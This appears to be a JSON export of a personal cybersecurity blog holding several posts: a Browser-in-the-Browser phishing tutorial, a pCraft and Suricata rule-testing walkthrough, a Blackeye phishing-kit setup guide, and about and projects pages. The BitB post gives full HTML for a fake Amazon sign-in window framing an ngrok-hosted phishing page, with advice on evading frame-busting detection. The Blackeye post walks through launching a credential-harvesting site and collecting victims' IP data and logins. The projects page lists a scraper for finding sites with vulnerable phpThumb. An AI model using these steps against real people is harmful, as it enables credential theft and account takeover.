[{"content":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\nHow does it work The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like \u0026ldquo;Continue with email\u0026rdquo;, \u0026ldquo;Continue with Facebook\u0026rdquo; etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.\nDemo To start off, we need to go to mr.d0x github page and get the template windows for this attack:\nhttps://github.com/mrd0x/BITB The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following: In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:\nhttps://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers Now that we have chosen a theme, let\u0026rsquo;s host a phishing website. I will go with blackeye one since I have made a post about it.\nWe first fire up our phishing website. It\u0026rsquo;s going to be an amazon one:\nAfterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using. The final html page should be something like the following:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;window\u0026#34;\u0026gt; \u0026lt;!-- Title bar start --\u0026gt; \u0026lt;div id=\u0026#34;title-bar-width\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;title-bar\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;margin-top:5px;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./amazon.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;15px\u0026#34; id=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;logo-description\u0026#34;\u0026gt;Please log to your account.\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span id=\u0026#34;minimize\u0026#34;\u0026gt;\u0026amp;#8212;\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;square\u0026#34;\u0026gt;□\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;exit\u0026#34;\u0026gt;✕\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;url-bar\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./ssl.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;20px\u0026#34; id=\u0026#34;ssl-padlock\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;domain-name\u0026#34;\u0026gt;https://www.amazon.com\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;domain-path\u0026#34;\u0026gt;/signin.html\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Content start --\u0026gt; \u0026lt;iframe id=\u0026#34;content\u0026#34; src=\u0026#34;https://44e5-46-177-73-144.ngrok-free.app\u0026#34; frameBorder=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; The victim should now see the following window, which seems legitimate: Upon entering the credentials, we should see them in our server: We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.\nDefenses The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.\nLater on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack. This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.\nSo if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.\nBitB without iframes In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated (\u0026ldquo;obfuscated\u0026rdquo;) approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called \u0026ldquo;Shadow DOM\u0026rdquo; in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.\nThe result is a fully working, undetected to framebusters SSO window using the bitb technique:\nThere are many things going on in frameless BitB but Wael Masri does a great job explaining the ins and outs of this technique and how you could replicate it:\nReferences\n[1] Mr.d0x: Browser In The Browser (BITB) Attack [2] Cofense email security: Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust [3] Infinite Logins: Browser in the Browser (BITB) Phishing Technique [3] Wael Masri: How To: Evilginx + BITB | Browser In The Browser without iframes in 2024 [4] waelmas: frameless-bitb ","permalink":"http://localhost:1313/posts/bitb/","summary":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.","title":"Browser-in-the-Browser (BitB) attack"},{"content":"","permalink":"http://localhost:1313/posts/malicious_sln/","summary":"","title":"Exploring the malicious side of .sln files"},{"content":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.\nIn summary, we need to run the following commands:\n{ \u0026#34;1) systemctl start docker\u0026#34;:\u0026#34;Starts docker\u0026#34;, \u0026#34;2) sudo docker pull sightingdb/pcraft\u0026#34;:\u0026#34;Pulls the docker image of the tool\u0026#34;, \u0026#34;3) docker run --name pcraft -d sightingdb/pcraft\u0026#34;:\u0026#34;Runs the tool\u0026#34;, \u0026#34;4) docker ps -a\u0026#34;:\u0026#34;Finds the ID of the docker process running the tool\u0026#34;, \u0026#34;5) docker exec -it {ID} bash\u0026#34;:\u0026#34;Executes the container in bash (meaning we get a shell inside the docker container)\u0026#34; } After that, we should be inside the docker container and run the tool without any errors:\nbuilder@4079f88d957d:~/pcraft$ ls \u0026#39;#hello.ami#\u0026#39; ami dns.ami parsuricata pyami.cpython-38-x86_64-linux-gnu.so setup.py LICENSE amigraph.py dns.pcap pcraft requirements.txt tests README.md build-pluginsdoc.py doc pcrafter samples tools builder@4079f88d957d:~/pcraft$ ./pcrafter Syntax: ./pcrafter script.ami output.pcap script.ami The .ami file contains actions that will be triggered and displayed inside the generated .pcap file. These actions can contain anything you see on a network traffic, like DNS queries, data being transfered, TCP handshakes etc.\nExample of an ami file An example of a .ami file is the following:\nami_version 1\r$victimip = \u0026#34;192.168.0.55\u0026#34;\r$fakebankip = \u0026#34;185.199.108.153\u0026#34;\raction DnsRequest {\r$ip-src = $victimip\r$ip-dst = $fakebankip\r$domain = \u0026#34;mikrosoft.com\u0026#34;\rexec DNSConnection\r}\raction PostData {\rexec HTTPConnection\r$method = \u0026#34;POST\u0026#34;\r$client-content-type = \u0026#34;application/x-www-form-urlencoded\u0026#34;\r$client-content = \u0026#34;login=Alfred.Wallace@example.com\u0026amp;password=qwerty1234\u0026#34;\r} This will basically trigger a DNS request and the resolved domain will be \u0026ldquo;mikrosoft.com\u0026rdquo; (you could set up a rule to detect such names later as we will see).\nAfterwards, we specify that a PostData action will take place which basically transfers some data - and specifically some user credentials.\nGenerating a pcap file based on an ami scenario Let\u0026rsquo;s see that in action:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter dns.ami dns.pcap All plugins loaded! Opening Script File dns.ami Executing action DnsRequest using DNSConnection Executing action PostData using HTTPConnection HTTP Method:POST builder@4079f88d957d:~/pcraft$ We copy over to our localhost the dns.pcap to view it in wireshark and then open it:\n┌──(connar㉿kali)-[~/blog/pcraft_tool] └─$ docker cp 4079f88d957d:/home/builder/pcraft/dns.pcap . └─$ wireshark dns.pcap\u0026amp; The result is the following pcap:\n└─$ tshark -r dns.pcap 1 Mar 16, 2024 21:30:18.468122000 EET 192.168.0.55 → 1.1.1.1 DNS 73 Standard query 0x0000 A mikrosoft.com 2 Mar 16, 2024 21:30:18.468536000 EET 1.1.1.1 → 192.168.0.55 DNS 102 Standard query response 0x0000 A mikrosoft.com A 185.199.108.153 3 Mar 16, 2024 21:30:18.469148000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [SYN] Seq=0 Win=8192 Len=0 4 Mar 16, 2024 21:30:18.469714000 EET 185.199.108.153 → 192.168.0.55 TCP 54 80 → 9279 [SYN, ACK] Seq=0 Ack=0 Win=8192 Len=0 5 Mar 16, 2024 21:30:18.470133000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [ACK] Seq=1 Ack=0 Win=8192 Len=0 6 Mar 16, 2024 21:30:18.470577000 EET 192.168.0.55 → 185.199.108.153 HTTP 311 POST / HTTP/1.1 (application/x-www-form-urlencoded) 7 Mar 16, 2024 21:30:18.471097000 EET 192.168.0.55 → 185.199.108.153 TCP 54 80 → 9279 [ACK] Seq=1 Ack=1 Win=8192 Len=0 8 Mar 16, 2024 21:30:18.471399000 EET 185.199.108.153 → 192.168.0.55 HTTP 268 HTTP/1.1 200 OK (text/html) Opening it in Wireshark, we get the following:\nNote: We can remove this \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Hello, you!\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; by going to pCraft/build/lib/pcraft/plugins/HTTPConnection.py or generally modifying it to our liking.\rTesting suricata rules on custom pcap As I mentioned earlier, pcraft is a great tool at making your own pcaps and testing rules upon them. In this part of the post, we are going to follow up on the example of the Red Team Village (see references) and create our own suricata rule, ami file and then generate a pcap and use tcpreplay to test if our rule is successful upon the generated custom network file.\nCreate the ami file (newsuricata.ami) The ami file we will use is the following:\nami_version 1\raction TriggerSuricata {\rexec Suricata\r$ip-src = \u0026#34;172.17.0.2\u0026#34;\r$ip-dst = \u0026#34;185.199.108.153\u0026#34;\r$rule = \u0026#34;\u0026#34;\u0026#34;alert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query GrayHat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20200809; rev:1;)\u0026#34;\u0026#34;\u0026#34;\r} Just a note here, we see that we exec Suricata. This file contains a domain called \u0026ldquo;GrayHat\u0026rdquo; as we will later see, so it uses this name as the $domain variable.\nCreate the Suricata rule (mydns.rule) The Suricata rule is a very simple one:\nalert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query Grayhat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20201020; rev:1;) It basically listens on all interfaces to find a dns query that contains the domain name \u0026ldquo;Grayhat\u0026rdquo;.\nTesting our rule Now that we have both the ami and the rule files ready, let\u0026rsquo;s generate the pcap file like we\u0026rsquo;ve seen previously:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter newsuricata.ami new.pcap The generated pcap is just a pcap that makes dns queries for the domain \u0026ldquo;Grayhat\u0026rdquo;:\nbuilder@4079f88d957d:~/pcraft$ tshark -r new.pcap 1 0.000000 172.17.0.2 ? 1.1.1.1 DNS 67 Standard query 0x0000 A grayhat 2 0.000409 1.1.1.1 ? 172.17.0.2 DNS 90 Standard query response 0x0000 A grayhat A 185.199.108.153 Now that we have a successfully generated pcap, let\u0026rsquo;s set up a listener with suricata (note that you must run the following as root user):\nroot@4079f88d957d:/home/builder/pcraft# suricata -S mydns.rule -i eth0 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - This is Suricata version 5.0.3 RELEASE running in SYSTEM mode 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - all 5 packet processing threads, 4 management threads initialized, engine started Then, we can just use tcpreplay with our previously generated pcap to replicate the traffic:\nbuilder@4079f88d957d:~/pcraft$ tcpreplay -i eth0 new.pcap Warning in interface.c:get_interface_list() line 93: May need to run as root to get access to all network interfaces. Fatal Error in sendpacket.c:sendpacket_open() line 544: failed to open device eth0: socket: Operation not permitted builder@4079f88d957d:~/pcraft$ sudo tcpreplay -i eth0 new.pcap Actual: 2 packets (157 bytes) sent in 0.000455 seconds Rated: 345054.9 Bps, 2.76 Mbps, 4395.60 pps Flows: 2 flows, 4395.60 fps, 2 flow packets, 0 non-flow Statistics for network device: eth0 Successful packets: 2 Failed packets: 0 Truncated packets: 0 Retried packets (ENOBUFS): 0 Retried packets (EAGAIN): 0 Now, moment of truth! Let\u0026rsquo;s see what has been written on /var/log/suricata/fast.log which basically contains alerts that get triggered based on matching suricata rules.\nroot@4079f88d957d:/home/builder/pcraft# cat /var/log/suricata/fast.log 03/17/2024-15:23:28.882746 [**] [1:20201020:1] DNS Query Grayhat [**] [Classification: (null)] [Priority: 3] {UDP} 172.17.0.2:4096 -\u0026gt; 1.1.1.1:53 Aaaaaand we got a successful alert! Isn\u0026rsquo;t this great?\npCraft seems like a great tool to play around and dive deeper into rules and custom traffic. I will definitely use this tool for training and maybe I\u0026rsquo;ll come back in the future with an extensive senario to take a look together.\nUntil next time everyone!\nReferences\n[1] Sans Technology Institute: Generating PCAP Files from YAML\r[2] github: pCraft repo\r[3] Red Team Village: Attacking Networks with pCraft\r","permalink":"http://localhost:1313/posts/pcraft/","summary":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.","title":"Exploring the pCraft tool"},{"content":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option. Setup of blackeye Its very quick and easy to set up blackeye. All you have to do is the following:\n┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ git clone https://github.com/EricksonAtHome/blackeye.git Cloning into \u0026#39;blackeye\u0026#39;... remote: Enumerating objects: 305, done. remote: Counting objects: 100% (161/161), done. remote: Compressing objects: 100% (119/119), done. remote: Total 305 (delta 68), reused 127 (delta 38), pack-reused 144 Receiving objects: 100% (305/305), 2.68 MiB | 1.73 MiB/s, done. Resolving deltas: 100% (92/92), done. ┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ cd blackeye ┌──(connar㉿kali)-[~/blog/black_eye_tool/blackeye] └─$ ./blackeye.sh :: Disclaimer: Developers assume no liability and are not :: :: responsible for any misuse or damage caused by BlackEye. :: :: Only use for educational purporses!! :: :: BLACKEYE By @EricksonAtHome :: [01] Instagram [17] DropBox [33] eBay [02] Facebook [18] Line [34] Amazon [03] Snapchat [19] Shopify [35] iCloud [04] Twitter [20] Messenger [36] Spotify [05] Github [21] GitLab [37] Netflix [06] Google [22] Twitch [38] Reddit [07] Origin [23] MySpace [39] StackOverflow [08] Yahoo [24] Badoo [40] Custom [09] Linkedin [25] VK [10] Protonmail [26] Yandex [11] Wordpress [27] devianART [12] Microsoft [28] Wi-Fi [13] IGFollowers [29] PayPal [14] Pinterest [30] Steam [15] Apple ID [31] Tiktok [16] Verizon [32] Playstation ┌─[ Choose an option:]─[~] └──╼ ~ 34 1.Ngrok 2.Localtunnel To continue, we need to set Ngrok server. We can download the binary from the ngrok website. Afterwards, we need to do the following steps:\n└─$ sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz └─$ sudo mv ngrok /usr/local/bin The final step is to set your auth token which can be found by making an account on the ngrok dashboard. There, you will find your auth token and then can do the last step, which is:\n└─$ ngrok config add-authtoken [your_auth_token] We can now switch back to blackeye and choose option 1:\n─[ Choose the tunneling method:]─[~] └──╼ ~ 1 [*] Starting php server... [*] Starting ngrok server... [*] Send this link to the Victim: [*] Use shortened link instead: [*] Waiting victim open the link ... To get the link, we have to run the ngrok binary we previously downloaded. The port it runs on is 5555 by default and can be found inside its code (and edited of course to listen to some other port like 8080):\n└─$ ngrok http 5555 ngrok (Ctrl+C to quit) Take our ngrok in production survey! https://forms.gle/[redacted] Session Status online Account [redacted] (Plan: Free) Version 3.8.0 Region [redacted] ([redacted]) Latency 362ms Web Interface http://127.0.0.1:4040 Forwarding https://[redacted].ngrok-free.app -\u0026gt; http://localhost:5555 Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00 Now that the server is running our phishing amazon site, let\u0026rsquo;s head back to blackeye:\n[*] Waiting victim open the link ... [*] IP Found! [*] IPv6: [redacted] [*] User-Agent: [redacted] [*] Country: [redacted] [*] Region: [redacted] [*] City: [redacted] [*] Postal: [redacted] [*] Location: [redacted] [*] Maps: [redacted] [*] ISP: [redacted] [*] Timezone: [redacted] [*] Saved: amazon/saved.ip.txt [*] Waiting credentials ... Visiting the url provided in the running ngrok instance, we are met with the following website:\nWe provide some rogue credentials and we have our result: ","permalink":"http://localhost:1313/posts/phishingsite/","summary":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option.","title":"Setting up a phishing site [using blackeye tool]"},{"content":" connar@localhost:~$ whoami { \u0026#34;Name\u0026#34;:\u0026#34;Connar\u0026#34;, \u0026#34;Location\u0026#34;:\u0026#34;Somewhere in Europe\u0026#34;, \u0026#34;Interests\u0026#34;:[ \u0026#34;Forensics\u0026#34;, \u0026#34;Malware Analysis\u0026#34;, \u0026#34;Maldev\u0026#34;, \u0026#34;Cryptography\u0026#34;, \u0026#34;Reverse Engineering\u0026#34;, \u0026#34;Security in general\u0026#34; ], \u0026#34;Age\u0026#34;:\u0026#34;22\u0026#34; } Hi! Im connar. Im 22 and I am learning various cybersecurity topics and experimenting with different random tools I stumble upon.\nI am mainly into malware stuff (analysis and dev) but also into forensics. To be honest, I am no expert, but I am trying to apply the Feynman\u0026rsquo;s technique which helps me a lot to memorize and better understand the stuff I am learning (thus, this blog).\nI also really like making CTF challenges, some of which you are going to see here in this blog:)\nThis is basically a journal into my journey into cybersecurity, keeping track of what I have learned and stuff that may seem useful to any of you that are reading it. Obviously, my posts and things I read from other authors and just try to try them myself, so credits go to them:)\nThat\u0026rsquo;s a wrap I think. Hope you stick around, have fun:)\n","permalink":"http://localhost:1313/about/","summary":"about","title":"About"},{"content":"","permalink":"http://localhost:1313/ctfwriteups/","summary":"ctf writeups","title":"CTF Writeups"},{"content":"","permalink":"http://localhost:1313/mychallenges/","summary":"my challenges","title":"My Challenges"},{"content":"A list of projects/tools that I have made along my journey of learning, either that be for a CTF or a real world scenario.\nForensics PcapAnalysis (GitHub) A script that is useful when analyzing malware traffic pcaps. It's goal is to find all HTTP and HTTPS hosts that a victim IP interacted with. Once it runs through the pcap file and collects all hosts which interacted with the victim ip, it makes request to VirusTotal in order to distinguish the malicious ones with the rest. It saves ...\rWeb Attacks vulnerable_phpThumb (GitHub) A script which scrapes the web using dorks to find domains that still use vulnerable versions of the phpThumb php script.\r","permalink":"http://localhost:1313/projects/","summary":"projects","title":"Projects"}]